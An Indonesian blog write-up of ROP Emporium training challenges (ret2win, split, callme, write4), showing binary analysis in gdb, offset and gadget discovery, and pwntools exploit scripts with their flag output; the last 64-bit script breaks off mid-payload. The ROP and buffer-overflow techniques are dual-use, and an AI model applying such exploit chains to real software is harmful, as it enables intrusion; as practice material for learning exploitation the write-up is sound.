---
title: "ROP Emporium"
date: 2021-02-10T22:29:10+07:00
description: "Writeup ROP Emporium x86 dan x86_64(Indonesia)"
tags: [writeups, linux, practice]
categories: [security]
comments: true
---

# Daftar Isi
[ret2win](#ret2win)\
[split](#split)\
[callme](#callme)\
[write4](#write4)

# ret2win
| File              | Download                                                                      |
|-------------------------|-------------------------------------------------------------------------------|
| [ret2win32](#ret2win32) | [klik](https://github.com/ahm4ddm/larebinex/blob/main/32/ret2win32/ret2win32)     |
| [ret2win64](#ret2win64) | [klik](https://github.com/ahm4ddm/larebinex/blob/main/64/ret2win/ret2win) |

### ret2win32 
kita cek terlebih dahulu filenya.\
Didapatkan file ELF, dan dynamically linked
```
$file ret2win32
ret2win32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e1596c11f85b3ed0881193fe40783e1da685b851, not stripped
```
lalu kita cek proteksi pada file. didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.\
kita bisa bypass NX dengan metode return oriented programming (rop) 
```
$checksec ret2win32
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
kita cek dengan gdb, saya mencoba dengan menampilkan semua fungsi yang ada pada binary
```
gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
...
...
...
0x08048510  __do_global_dtors_aux
0x08048540  frame_dummy
0x08048546  main
0x080485ad  pwnme
0x0804862c  ret2win
0x08048660  __libc_csu_init
0x080486c0  __libc_csu_fini
0x080486c4  _fini
```
kita coba disassembly fungsi ***main***.\
pada fungsi main binary memanggil fungsi yaitu ***pwnme***
```
gdb-peda$ pdisas main
Dump of assembler code for function main:
   ...
   ...
   ...
   0x08048583 <+61>:	call   0x80483d0 <puts@plt>
   0x08048588 <+66>:	add    esp,0x10
   0x0804858b <+69>:	call   0x80485ad <pwnme>
   ...
   ...
   ...
End of assembler dump.

```
kita disassembly fungsi ***pwnme*** ternyata ada kerentanan fungsi ***read*** dimana tidak ada Null Byte pada saat input berakhir.
```
gdb-peda$ pdisas pwnme
Dump of assembler code for function pwnme:
...
...
...
   0x0804860e <+97>:	push   eax
   0x0804860f <+98>:	push   0x0
   0x08048611 <+100>:	call   0x80483b0 <read@plt>
   0x08048616 <+105>:	add    esp,0x10
   0x08048619 <+108>:	sub    esp,0xc
...
...
...
```
Tidak ada pemanggilan fungsi ***ret2win*** pada binary.\
kita cek disassembly fungsi ***ret2win***
ternyata ada pemanggilan ***system***
```
gdb-peda$ pdisas ret2win
Dump of assembler code for function ret2win:
...
...
...
   0x08048645 <+25>:	push   0x8048813
   0x0804864a <+30>:	call   0x80483e0 <system@plt>
...
...
...
```
saya beranggapan bahwa itu memanggil ***system(cat flag.txt)*** dan ternyata benar
```
0x8048813:	"/bin/cat flag.txt"
```
Kita buat exploit code.\
Pertama harus tau offset ke EIP.\
didapatkan 44.
```
Registers contain pattern buffer:
ECX+52 found at offset: 69
EDX+52 found at offset: 69
EBP+0 found at offset: 40
EIP+0 found at offset: 44
Registers point to pattern buffer:
[ESP] --> offset 48 - size ~8
Pattern buffer found at:
0xffffd0c0 : offset    0 - size   56 ($sp + -0x30 [-12 dwords])
References to pattern buffer found at:
0xffffd0b4 : 0xffffd0c0 ($sp + -0x3c [-15 dwords])
```

kita buat kode exploit 
```
from pwn import *
p = ELF('./ret2win32')
r = process('./ret2win32')

ret2win = p.symbols['ret2win']
junk = b'X'*44
junk += p32(ret2win)
log.info('ret2win 0x%x' %ret2win)
r.sendline(junk)
r.interactive()
```
```
$python3 solver.py
...
...
...
> Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$  
```

### ret2win64
kita cek terlebih dahulu filenya.\
Didapatkan file ELF, dan dynamically linked
```
$file ret2win
ret2win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=19abc0b3bb228157af55b8e16af7316d54ab0597, not stripped
```
lalu kita cek proteksi pada file. didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.\
kita bisa bypass NX dengan metode return oriented programming (rop) 
```
$checksec ret2win
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
Setelah dilakukan pengecekan pada gdb sama seperti binary 32 bit\
Kita cari offset. didapatkan 40\
Mungkin disini timbul pertanyaan, kenapa RIP tidak ter-overwrite?
karena aplikasi yang berjalan pada arsitektur 64-bit hanya me-load canonical address ke dalam register ***RIP***\
Contoh: Ketika overflow sebuah buffer dengan pattern yang kita buat dan ingin melihat ***RIP*** tertimpa dengan alamat pattern seharusnya tidak bisa karena itu bukan canonical address. lebih lanjut kunjungi [ini](https://en.wikipedia.org/wiki/X86-64#Virtual_address_space_details)
```
Registers contain pattern buffer:
RBP+0 found at offset: 32
Registers point to pattern buffer:
[RSP] --> offset 40 - size ~35
Pattern buffer found at:
0x00007fffffffdf30 : offset    0 - size   56 ($sp + -0x28 [-10 dwords])
References to pattern buffer found at:
0x00007fffffffb340 : 0x00007fffffffdf30 ($sp + -0x2c18 [-2822 dwords])
0x00007fffffffdb40 : 0x00007fffffffdf30 ($sp + -0x418 [-262 dwords])
0x00007fffffffdb58 : 0x00007fffffffdf30 ($sp + -0x400 [-256 dwords])
```
Kita buat kode exploit
```
from pwn import *

p = ELF('./ret2win')
r = process('./ret2win')

ret2win = p.symbols['ret2win']
junk = b'X'*40
junk += p64(ret2win)
log.info('ret2win 0x%x' %ret2win)
r.sendline(junk)
r.interactive()
```
```
$python3 sol.py
...
...
...
> Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$  
```
[created at: February 10, 2021]

# split
| File              | Download                                                                      |
|-------------------------|-------------------------------------------------------------------------------|
| [ret2split32](#ret2split32) | [klik](https://github.com/ahm4ddm/larebinex/blob/main/32/split32/split32)     |
| [ret2split64](#ret2split64) | [klik](https://github.com/ahm4ddm/larebinex/blob/main/64/split/split64) |
### ret2split32
Kita cek terlebih dahulu informasi file\
didapatkan file ELF dan dynamically linked.
```
$file split32
split32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=76cb700a2ac0484fb4fa83171a17689b37b9ee8d, not stripped
```
lalu kita cek proteksi pada file. didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.\
kita bisa bypass NX dengan metode return oriented programming (rop).
```
$checksec split32
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
kita cek semua fungsi menggunakan gdb.
```
gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
...
...
...
0x080484d0  register_tm_clones
0x08048510  __do_global_dtors_aux
0x08048540  frame_dummy
0x08048546  main
0x080485ad  pwnme
0x0804860c  usefulFunction
0x08048630  __libc_csu_init
0x08048690  __libc_csu_fini
0x08048694  _fini
```
kita lakukan disassembly fungsi ***main***
```
gdb-peda$ pdisas main
Dump of assembler code for function main:
...
...
...
0x08048583 <+61>:	call   0x80483d0 <puts@plt>
0x08048588 <+66>:	add    esp,0x10
0x0804858b <+69>:	call   0x80485ad <pwnme>
...
...
...
```
Pada fungsi main hanya memanggil fungsi ***pwnme***.\
kita disassembly fungsi ***pwnme***
```
gdb-peda$ pdisas pwnme
Dump of assembler code for function pwnme:
...
...
...
   0x080485ee <+65>:	push   eax
   0x080485ef <+66>:	push   0x0
   0x080485f1 <+68>:	call   0x80483b0 <read@plt>
   0x080485f6 <+73>:	add    esp,0x10
   0x080485f9 <+76>:	sub    esp,0xc
...
...
...
```
Pada fungsi ***pwnme*** terdapat kerentanan ***read*** dimana tidak ada Null Byte pada saat input berakhir.\
Tidak ada pemanggilan fungsi ***usefulFunction*** pada binary.\
kita cek disassembly fungsi ***usefulFunction***
ternyata ada pemanggilan ***system***
```
gdb-peda$ pdisas usefulFunction
Dump of assembler code for function usefulFunction:
   0x0804860c <+0>:	push   ebp
   0x0804860d <+1>:	mov    ebp,esp
   0x0804860f <+3>:	sub    esp,0x8
   0x08048612 <+6>:	sub    esp,0xc
   0x08048615 <+9>:	push   0x804870e
   0x0804861a <+14>:	call   0x80483e0 <system@plt>
   0x0804861f <+19>:	add    esp,0x10
   0x08048622 <+22>:	nop
   0x08048623 <+23>:	leave  
   0x08048624 <+24>:	ret    
End of assembler dump.
```
Permasalahannya yaitu fungsi ini tidak memanggil ***system(cat flag.txt)*** melainkan memanggil ***system(/bin/ls)***\
Pada challenge ini kita masih bisa memanggil ***/bin/cat flag.txt***
```
Don't just take my word for it, let's check the call to system() and that useful string are actually here.
```
Ingat argumen dari fungsi yang dijalankan pada arsitektur 32-bit disimpan pada stack.\
setelah kita memanggil fungsi ***system yang benar***\
 lalu kita panggil ***/bin/cat flag.txt***
```
system() returns after the command has been completed.
```
Kita cari dulu offset ke ***EIP***
```
Registers contain pattern buffer:
ECX+52 found at offset: 69
EDX+52 found at offset: 69
EBP+0 found at offset: 40
EIP+0 found at offset: 44
Registers point to pattern buffer:
[ESP] --> offset 48 - size ~114
Pattern buffer not found in memory
Reference to pattern buffer not found in memory
```
didapatkan 44

Kita buat kode exploit

```
from pwn import *

p = ELF('./split32')
r = process('./split32')

sys = p.plt['system']
magic = next(p.search(b'/bin/cat flag.txt\x00'))
log.info('system 0x%x' %sys)
log.info('magic 0x%x' %magic)
junk = b'X'*44
payload = junk
payload += p32(sys)
payload += b'Y'*4
payload += p32(magic)
r.sendline(payload)
r.interactive()
```
```
$python3 sol.py
split by ROP Emporium
x86

Contriving a reason to ask user for data...
> Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$ 
```

### ret2split64
Kita cek terlebih dahulu informasi file\
didapatkan file ELF dan dynamically linked.
```
$file split
split: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=98755e64e1d0c1bff48fccae1dca9ee9e3c609e2, not stripped
```
lalu kita cek proteksi pada file. didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.\
kita bisa bypass NX dengan metode return oriented programming (rop).
```
$checksec split
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
Setelah dilakukan pengecekan dengan gdb, semua fungsi sama.\
langsung saja ke proses exploit.\
Sebelum itu, ingat argumen dari fungsi yang dijalankan pada arsitektur 64-bit disimpan pada register [RDI, RSI, RDX,RCX, R8, R9](https://ctf101.org/binary-exploitation/what-are-calling-conventions/)\
Pertama kita cari offset terlebih dahulu
```
Registers contain pattern buffer:
RBP+0 found at offset: 32
Registers point to pattern buffer:
[RSP] --> offset 40 - size ~56
Pattern buffer found at:
0x00007fffffffdf30 : offset    0 - size   96 ($sp + -0x28 [-10 dwords])
References to pattern buffer found at:
0x00007fffffffb340 : 0x00007fffffffdf30 ($sp + -0x2c18 [-2822 dwords])
0x00007fffffffdb40 : 0x00007fffffffdf30 ($sp + -0x418 [-262 dwords])
0x00007fffffffdb58 : 0x00007fffffffdf30 ($sp + -0x400 [-256 dwords])
```
Didapatkan 40.\
Kita buat kode exploit
```
from pwn import *

p = ELF('./split')
r = process('./split')
rop = ROP('./split')

sys = p.plt['system']
magic = next(p.search(b'/bin/cat flag.txt'))
popret = rop.find_gadget(['pop rdi', 'ret'])[0]
log.info('system 0x%x' %sys)
log.info('magic 0x%x' %magic)

junk = b'X'*40
payload = junk
payload += p64(popret)
payload += p64(magic)
payload += p64(sys)

r.sendline(payload)
r.interactive()
```
```
$python3 sol.py
Contriving a reason to ask user for data...
> Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$ 
```
[Created at: February 11, 2021]

# callme
| File              | Download                                                                    |
|-------------------------|-----------------------------------------------------------------------------|
| [callme32](#callme32)  | [klik](https://github.com/ahm4ddm/larebinex/blob/main/32/callme32/callme32) |
| [callme64](#callme64) | [klik](https://github.com/ahm4ddm/larebinex/blob/main/64/callme/callme)     |

### callme32
kita cek terlebih dahulu filenya.\
Didapatkan file ELF, dan dynamically linked
```
$file callme
callme: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e8e49880bdcaeb9012c6de5f8002c72d8827ea4c, not stripped
```
lalu kita cek proteksi pada file.\
didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.\
kita bisa bypass NX dengan metode return oriented programming (rop).
```
$checksec callme32
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
    RUNPATH:  b'.'
```
Kita cek menggunakan gdb untuk menampilkan semua fungsi.
```
gdb-peda$ info function
All defined functions:

Non-debugging symbols:
...
...
...
0x08048650  __do_global_dtors_aux
0x08048680  frame_dummy
0x08048686  main
0x080486ed  pwnme
0x0804874f  usefulFunction
0x080487a0  __libc_csu_init
0x08048800  __libc_csu_fini
0x08048804  _fini
```
Kita coba lakukan disassembly fungsi ***main***
```
gdb-peda$ pdisas main
Dump of assembler code for function main:
...
...
...
   0x080486c8 <+66>:	add    esp,0x10
   0x080486cb <+69>:	call   0x80486ed <pwnme>
...
...
...
```
Pada fungsi ***main*** memanggil ***pwnme***\
Kita lakukan disassembly fungsinya
```
gdb-peda$ pdisas pwnme
Dump of assembler code for function pwnme:
...
...
... 
   0x08048731 <+68>:	push   eax
   0x08048732 <+69>:	push   0x0
   0x08048734 <+71>:	call   0x80484c0 <read@plt>
   0x08048739 <+76>:	add    esp,0x10
   0x0804873c <+79>:	sub    esp,0xc
...
...
...
```
Pada challenge ini, untuk mendapatkan flag kita harus memasukkan 3 argumen.
```
You must call the callme_one(), callme_two() and callme_three() functions in that order, each with the arguments 0xdeadbeef, 0xcafebabe, 0xd00df00d e.g. callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d) to print the flag
```
Pada ***callme_one()*** kita isi dengan 3 argumen lalu kita panggil ***callme_two()*** lalu isi 3 argumen dst.\
Kita cari gadget pop tiga kali.
```
Gadgets information
============================================================
0x080487fb : pop ebp ; ret
0x080487f8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080484ad : pop ebx ; ret
0x080487fa : pop edi ; pop ebp ; ret
0x080487f9 : pop esi ; pop edi ; pop ebp ; ret
0x08048496 : ret
0x0804861e : ret 0xeac1

Unique gadgets found: 7
```
Kita pakai 0x080487f9.\
Selanjutnya kita cari offset ke ***EIP***
```
Registers contain pattern buffer:
ECX+52 found at offset: 69
EDX+52 found at offset: 69
EBP+0 found at offset: 40
EIP+0 found at offset: 44
Registers point to pattern buffer:
[ESP] --> offset 48 - size ~90
Pattern buffer found at:
0xf7fca6d9 : offset 33208 - size    4 (/media/ahm4d/Belajar/1 Kuliah/!github/binex/rop_emporium_all_challenges/callme32/libcallme32.so)
0xffffd0c0 : offset    0 - size  100 ($sp + -0x30 [-12 dwords])
References to pattern buffer found at:
0xffffd0b4 : 0xffffd0c0 ($sp + -0x3c [-15 dwords])
```
Offset 44.\
Kita buat kode exploit
```
from pwn import *

p = ELF('./callme32')
r = process('./callme32')
call1 = p.plt['callme_one']
call2 = p.plt['callme_two']
call3 = p.plt['callme_three']
pop3 = 0x080487f9
log.info('call1 0x%x' %call1)
log.info('call2 0x%x' %call2)
log.info('call3 0x%x' %call3)
junk = b'X'*44
payload = junk
payload += p32(call1)
payload += p32(pop3)
payload += p32(0xdeadbeef)
payload += p32(0xcafebabe)
payload += p32(0xd00df00d)
payload += p32(call2)
payload += p32(pop3)
payload += p32(0xdeadbeef)
payload += p32(0xcafebabe)
payload += p32(0xd00df00d)
payload += p32(call3)
payload += p32(pop3)
payload += p32(0xdeadbeef)
payload += p32(0xcafebabe)
payload += p32(0xd00df00d)
r.sendline(payload)
r.interactive()
```
Jalankan maka didapatkan flag
```
$python3 sol.py
> Thank you!
callme_one() called correctly
callme_two() called correctly
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$  
```
### callme64
kita cek terlebih dahulu filenya.\
Didapatkan file ELF, dan dynamically linked
```
$file callme
callme: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e8e49880bdcaeb9012c6de5f8002c72d8827ea4c, not stripped
```
lalu kita cek proteksi pada file.\
didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.\
kita bisa bypass NX dengan metode return oriented programming (rop)
```
$checksec callme
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
```
Kita cek menggunakan gdb untuk menampilkan semua fungsi.
```
gdb-peda$ info function
All defined functions:

Non-debugging symbols:
...
...
...
0x0000000000400840  frame_dummy
0x0000000000400847  main
0x0000000000400898  pwnme
0x00000000004008f2  usefulFunction
0x000000000040093c  usefulGadgets
0x0000000000400940  __libc_csu_init
0x00000000004009b0  __libc_csu_fini
0x00000000004009b4  _fini
```
Setelah saya disassembly fungsi ***main dan pwnme*** sama seperti fungsi pada binary 32-bit.\
Challenge ini sama seperti binary 32-bit diatas. yaitu untuk menampilkan flag kita harus mengisi ***callme_one, callme_two, dan callme_three*** dengan menggunakan 3 argumen.
```
For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
```
Pada binary 64-bit ada fungsi menarik yaitu ***usefulGadgets*** dimana add 3 gadgets pop yang mana sangat berguna sekali untuk proses eksploit. daripada kita mencari secara manual.\
Kita cari offset dahulu.
```
Registers contain pattern buffer:
RBP+0 found at offset: 32
Registers point to pattern buffer:
[RSP] --> offset 40 - size ~62
Pattern buffer found at:
0x00007ffff7fc98bb : offset 33208 - size    4 (/media/ahm4d/Belajar/1 Kuliah/!github/binex/rop_emporium_all_challenges/callme/libcallme.so)
0x00007fffffffdf40 : offset    0 - size  100 ($sp + -0x28 [-10 dwords])
References to pattern buffer found at:
0x00007fffffffb350 : 0x00007fffffffdf40 ($sp + -0x2c18 [-2822 dwords])
0x00007fffffffdb40 : 0x00007fffffffdf40 ($sp + -0x428 [-266 dwords])
0x00007fffffffdb58 : 0x00007fffffffdf40 ($sp + -0x410 [-260 dwords])
```
Offset 40.\
Kita buat kode exploit
```
from pwn import *

p = ELF('./callme')
r = process('./callme')
call1 = p.plt['callme_one']
call2 = p.plt['callme_two']
call3 = p.plt['callme_three']
pop3 = p.symbols['usefulGadgets']
junk = b'X'*40
payload = junk
payload += p64(pop3)
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(call1)
payload += p64(pop3)
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(call2)
payload += p64(pop3)
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(call3)
r.sendline(payload)
r.interactive()
```
Jalankan maka didapatkan flag
```
$python3 sol.py
> Thank you!
callme_one() called correctly
callme_two() called correctly
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$ 
```
[Created at: February 13, 2021]

# write4
| File            | Download                                                                    |
|-----------------------|-----------------------------------------------------------------------------|
| [write432](#write432) | [klik](https://github.com/ahm4ddm/larebinex/blob/main/32/write432/write432) |
| [write4](#write4)     | [klik](https://github.com/ahm4ddm/larebinex/blob/main/64/write4/write4)     |
### write432
Kita cek terlebih filenya.\
Didapatkan file ELF, dan dynamically linked
```
$file write432
write432: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=7142f5deace762a46e5cc43b6ca7e8818c9abe69, not stripped
```
Lalu kita cek proteksi pada file.\
didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.\
kita bisa bypass NX dengan metode return oriented programming (rop).
```
$checksec write432
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
    RUNPATH:  b'.' 
```
Kita cek menggunakan gdb untuk menampilkan semua fungsi.
```
gdb-peda$ info function
All defined functions:

Non-debugging symbols:
...
...
...
0x08048500  frame_dummy
0x08048506  main
0x0804852a  usefulFunction
0x08048543  usefulGadgets
0x08048550  __libc_csu_init
0x080485b0  __libc_csu_fini
0x080485b4  _fini
```
Kita coba lakukan disassembly fungsi ***main***
```
gdb-peda$ pdisas main
Dump of assembler code for function main:
...
...
...
   0x08048513 <+13>:	push   ecx
   0x08048514 <+14>:	sub    esp,0x4
   0x08048517 <+17>:	call   0x80483b0 <pwnme@plt>
...
...
...
```
Pada fungsi ***main*** memanggil ***pwnme***\
Kita lakukan disassembly fungsinya
```
gdb-peda$ pdisas 0x80483b0
Dump of assembler code from 0x80483b0 to 0x80483d0::	Dump of assembler code from 0x80483b0 to 0x80483d0:
   0x080483b0 <pwnme@plt+0>:	jmp    DWORD PTR ds:0x804a00c
   0x080483b6 <pwnme@plt+6>:	push   0x0
   0x080483bb <pwnme@plt+11>:	jmp    0x80483a0
   0x080483c0 <__libc_start_main@plt+0>:	jmp    DWORD PTR ds:0x804a010
   0x080483c6 <__libc_start_main@plt+6>:	push   0x8
   0x080483cb <__libc_start_main@plt+11>:	jmp    0x80483a0
End of assembler dump.
```
Setelah saya analisa ada fungsi yang menurut saya menarik tapi tidak pernah terpanggil. nah menggunakan metode Return Oriented Programming (rop) sebagai solusi.\
Pada fungsi ***usefulFunction*** kita gunakan untuk mencetak flag.
```
gdb-peda$ pdisas 0x0804852a
Dump of assembler code from 0x804852a to 0x804854a::	Dump of assembler code from 0x804852a to 0x804854a:
   0x0804852a <usefulFunction+0>:	push   ebp
   0x0804852b <usefulFunction+1>:	mov    ebp,esp
   0x0804852d <usefulFunction+3>:	sub    esp,0x8
   0x08048530 <usefulFunction+6>:	sub    esp,0xc
   0x08048533 <usefulFunction+9>:	push   0x80485d0
   0x08048538 <usefulFunction+14>:	call   0x80483d0 <print_file@plt>
   0x0804853d <usefulFunction+19>:	add    esp,0x10
   0x08048540 <usefulFunction+22>:	nop
   0x08048541 <usefulFunction+23>:	leave  
   0x08048542 <usefulFunction+24>:	ret    
   0x08048543 <usefulGadgets+0>:	mov    DWORD PTR [edi],ebp
   0x08048545 <usefulGadgets+2>:	ret    
   0x08048546 <usefulGadgets+3>:	xchg   ax,ax
   0x08048548 <usefulGadgets+5>:	xchg   ax,ax
End of assembler dump.
```
Permasalahannya yaitu tidak ada string '/bin/cat flag.txt'.
```
On completing our usual checks for interesting strings and symbols in this binary we're confronted with the stark truth that our favourite string "/bin/cat flag.txt" is not present this time.
```
Pada fungsi ***usefulGadgets*** kita bisa menulis string 'flag.txt'.
```
gdb-peda$ pdisas 0x08048543
Dump of assembler code from 0x8048543 to 0x8048563::	Dump of assembler code from 0x8048543 to 0x8048563:
   0x08048543 <usefulGadgets+0>:	mov    DWORD PTR [edi],ebp
   0x08048545 <usefulGadgets+2>:	ret    
...
...
...
```
namun yang jadi masalah yaitu apakah ada permissions write pada file ELF tersebut, karena kalau tidak ada permissions tersebut tidak bisa walaupun sudah kita buat string 'flag.txt'. pada arsitektur 32-bit kita menulis nilai sebesar 4 byte.
 ```
 Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
...
...
...
  [23] .got.plt          PROGBITS        0804a000 001000 000018 04  WA  0   0  4
  [24] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4
  [25] .bss              NOBITS          0804a020 001020 000004 00  WA  0   0  1
  [26] .comment          PROGBITS        00000000 001020 000029 01  MS  0   0  1
  [27] .symtab           SYMTAB          00000000 00104c 000440 10     28  47  4
  [28] .strtab           STRTAB          00000000 00148c 000211 00      0   0  1
  [29] .shstrtab         STRTAB          00000000 00169d 000105 00      0   0  1
 ```
 ternyata .got.plt .data .bss permissions Write(W), jadi kita bisa mencetak flag.txt.\
 kita cari pop 2 kali
 ```
 Gadgets information
============================================================
0x080485ab : pop ebp ; ret
0x080485a8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0804839d : pop ebx ; ret
0x080485aa : pop edi ; pop ebp ; ret
0x080485a9 : pop esi ; pop edi ; pop ebp ; ret
0x08048386 : ret
0x0804849e : ret 0xeac1

Unique gadgets found: 7
```
saya gunakan ***pop edi pop ebp ret*** karena pada fungsi ***usefulGadgets***  nilai register ebp akan dipindahkan ke register edi\
***0x08048543 <+0>:	mov    DWORD PTR [edi],ebp***\
Kita buat kode exeploit
```
from pwn import *

p = ELF('./write432')
r = process('./write432')
printFlag = p.plt['print_file']
gadgets = p.symbols['usefulGadgets']
pop_edi_ebp = 0x080485aa
bss = 0x804a020
log.info('print_flag 0x%x' %printFlag)
log.info('gadgets 0x%x' %gadgets)
log.info('pop edi ebp ret 0x%x' %pop_edi_ebp)
log.info('bss 0x%x' %bss)
junk = b'X'*44
payload = junk
payload += p32(pop_edi_ebp)
payload += p32(bss)
payload += b'flag'
payload += p32(gadgets)
payload += p32(pop_edi_ebp)
payload += p32(bss + 0x4)
payload += b'.txt'
payload += p32(gadgets)
payload += p32(printFlag)
payload += b'Y'*4
payload += p32(bss)
r.sendline(payload)
r.interactive()
```
Jalankan maka didapatkan flag
```
$python3 sol.py
> Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Process './write432' stopped with exit code -11 (SIGSEGV) (pid 12182)
[*] Got EOF while reading in interactive
$  
```

### write4
Kita cek terlebih filenya.\
Didapatkan file ELF, dan dynamically linked
```
$file write4
write4: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=4cbaee0791e9daa7dcc909399291b57ffaf4ecbe, not stripped
```
Lalu kita cek proteksi pada file.\
didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.\
kita bisa bypass NX dengan metode return oriented programming (rop).
```
$checksec write4
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
```
Kita cek menggunakan gdb untuk menampilkan semua fungsi.
```
gdb-peda$ info function
All defined functions:

Non-debugging symbols:
...
...
...
0x0000000000400600  frame_dummy
0x0000000000400607  main
0x0000000000400617  usefulFunction
0x0000000000400628  usefulGadgets
0x0000000000400630  __libc_csu_init
0x00000000004006a0  __libc_csu_fini
0x00000000004006a4  _fini
```
Hampir sama dengan binary 64 namun ada sedikit perbedaan pada fungsi ***usefulGadgets***
```
gdb-peda$ pdisas usefulGadgets
Dump of assembler code for function usefulGadgets:
   0x0000000000400628 <+0>:	mov    QWORD PTR [r14],r15
   0x000000000040062b <+3>:	ret    
   0x000000000040062c <+4>:	nop    DWORD PTR [rax+0x0]
End of assembler dump.
```
Kita cek permisssions pada file section
```
Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  [21] .got              PROGBITS         0000000000600ff0  00000ff0
       0000000000000010  0000000000000008  WA       0     0     8
  [22] .got.plt          PROGBITS         0000000000601000  00001000
       0000000000000028  0000000000000008  WA       0     0     8
  [23] .data             PROGBITS         0000000000601028  00001028
       0000000000000010  0000000000000000  WA       0     0     8
  [24] .bss              NOBITS           0000000000601038  00001038
       0000000000000008  0000000000000000  WA       0     0     1
```
.got .got.plt .data .bss didapatkan permissions Write (W).\
kita cari pop r14 r15 dan pop rdi
```
Gadgets information
============================================================
0x00000000004005e2 : mov byte ptr [rip + 0x200a4f], 1 ; pop rbp ; ret
0x0000000000400629 : mov dword ptr [rsi], edi ; ret
0x0000000000400610 : mov eax, 0 ; pop rbp ; ret
0x0000000000400628 : mov qword ptr [r14], r15 ; ret
0x000000000040068c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040068e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400690 : pop r14 ; pop r15 ; ret
0x0000000000400692 : pop r15 ; ret
0x000000000040068b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040068f : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400588 : pop rbp ; ret
0x0000000000400693 : pop rdi ; ret
0x0000000000400691 : pop rsi ; pop r15 ; ret
0x000000000040068d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004004e6 : ret

Unique gadgets found: 15
```
Saya memakai ***0x0000000000400690*** untuk pop 14 pop 15 dan ***0x0000000000400693*** untuk pop rdi.\
Kita buat kode exploit
```
from pwn import *

p = ELF('./write4')
r = process('./write4')

gadgets = p.symbols['usefulGadgets']
printFlag = p.symbols['print_file']
bss = 0x000000000601038
pop_r14_r15 = 0x0000000000400690
pop_rdi = 0x0000000000400693
log.info('print_flag 0x%x' %printFlag)
log.info('gadgets 0x%x' %gadgets)
log.info('pop rdi 0x%x' %pop_rdi)
log.info('mov r14 r15 0x%x' %gadgets)
log.info('pop r14 r15 0x%x' %pop_r14_r15)
log.info('bss 0x%x' %bss)
junk = b'X'*40
payload = junk
